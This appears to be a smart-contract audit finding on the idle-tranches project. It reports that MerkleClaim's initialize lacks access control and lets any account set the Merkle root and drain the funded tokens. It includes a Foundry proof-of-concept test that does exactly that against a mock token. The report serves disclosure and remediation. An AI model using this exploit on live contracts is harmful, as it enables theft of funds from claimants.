### Title
Unauthenticated `initialize` on MerkleClaim lets any EOA seize the distribution and drain all airdropped tokens - ([File: contracts/MerkleClaim.sol](contracts/MerkleClaim.sol))

### Summary
The external report describes a sensitive surface (`/api/4/config`) exposed without authentication, leaking everything behind it. The on-chain analog in idle-tranches is `MerkleClaim.initialize`: a permissionless, unauthenticated initializer on a cloneable distribution contract that controls the single gate (`merkleRoot`) protecting every token held for claimants. An unprivileged attacker who reaches the contract before (or instead of) the deployer can set an arbitrary `merkleRoot` naming themselves, then `claim` the entire token balance.

### Finding Description
`MerkleClaim` is explicitly designed to be cloneable ("no ERC20, cloneable" in the contract header) [1](#0-0) . Its initializer only checks that `token == address(0)` and has no access control, no `initializer` modifier tied to a factory, and no deployer binding [2](#0-1) . Once initialized, `claim` verifies a Merkle proof against `merkleRoot` and transfers `amount` tokens to `to` — so whoever controls `merkleRoot` controls the full balance [3](#0-2) . The only recovery path is `sweep`, which is timelocked to `deployTime + 60 days` and restricted to `TL_MULTISIG`, so it cannot preempt a same-block drain [4](#0-3) . No guard in `claim` (already-claimed flag, proof verification) stops the attacker because they authored the root and supply a valid proof for their own leaf.

### Impact Explanation
Direct theft of 100% of tokens held by an uninitialized `MerkleClaim` clone. Any EOA can call `initialize` in the same block the funding transfer lands (or front-run the legitimate `initialize`), set `merkleRoot` to a root containing only their own `(attacker, amount)` leaf, and call `claim(attacker, fullBalance, proof)` to receive the whole balance in one transaction. The broken invariant is access control: the function that defines the distribution trust root is unauthenticated.

### Likelihood Explanation
Exploitation requires the deployment/funding window in which `token == address(0)` while tokens are present — a real operational pattern since the contract docblock says the token "must be sent to this contract" [5](#0-4) . A generic mempool/clone watcher suffices; the attacker needs no privileges and pays only gas. If a factory always deploys-and-initializes atomically in production, likelihood drops, but nothing in the contract enforces that pattern — the guard (`token == address(0)`) cannot distinguish legitimate deployer from attacker.

### Recommendation
Bind initialization to the deployer: store `deployer = msg.sender` in the constructor (for the implementation and cloned via factory), and require `msg.sender == deployer` or a factory `onlyFactory` check in `initialize`. Alternatively, pass `merkleRoot`/`token` as constructor/immutable args in clones, or have the factory call `initialize` in the same transaction that creates the clone.

### Proof of Concept
Foundry PoC sketch:

```solidity
// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../contracts/MerkleClaim.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("RWD", "RWD") { _mint(msg.sender, 1_000_000e18); }
}

contract MerkleClaimInitHijackTest is Test {
    MerkleClaim impl;
    MockERC20 reward;
    address attacker = makeAddr("attacker");

    function testUnauthenticatedInitializeDrainsFunds() public {
        // Deploy clone (uninitialized) — no factory auth anywhere
        impl = new MerkleClaim();
        reward = new MockERC20();

        // Ops funds the contract before initialize lands (or attacker front-runs initialize)
        reward.transfer(address(impl), 1_000_000e18);

        // Attacker calls initialize with a root containing only their leaf
        uint256 amt = 1_000_000e18;
        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(attacker, amt))));
        vm.prank(attacker);
        impl.initialize(leaf, address(reward));

        // Attacker claims the entire balance with a single-leaf proof (empty proof)
        bytes32[] memory proof = new bytes32[](0);
        vm.prank(attacker);
        impl.claim(attacker, amt, proof);

        assertEq(reward.balanceOf(attacker), amt);
        assertEq(reward.balanceOf(address(impl)), 0);
    }
}
```

Steps: deploy `MerkleClaim`, fund it, attacker `initialize` + `claim` — full drain. `sweep` cannot intervene due to the 60-day delay.

```text
  function claim(address to, uint256 amount, bytes32[] calldata proof) external {
    // Throw if address has already claimed tokens
    if (hasClaimed[to]) revert AlreadyClaimed();

    // Verify merkle proof, or revert if not in tree,
    // double keccak is preferred https://github.com/OpenZeppelin/merkle-tree#user-content-fn-1-786ed85226485d53b8a7834b144c1642
    bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(to, amount))));
    bool isValidLeaf = MerkleProofUpgradeable.verify(proof, merkleRoot, leaf);
    if (!isValidLeaf) revert NotInMerkle();

    // Set address to claimed
    hasClaimed[to] = true;

    // Transfer tokens to claimee
    IERC20Upgradeable(token).transfer(to, amount);
  }
```
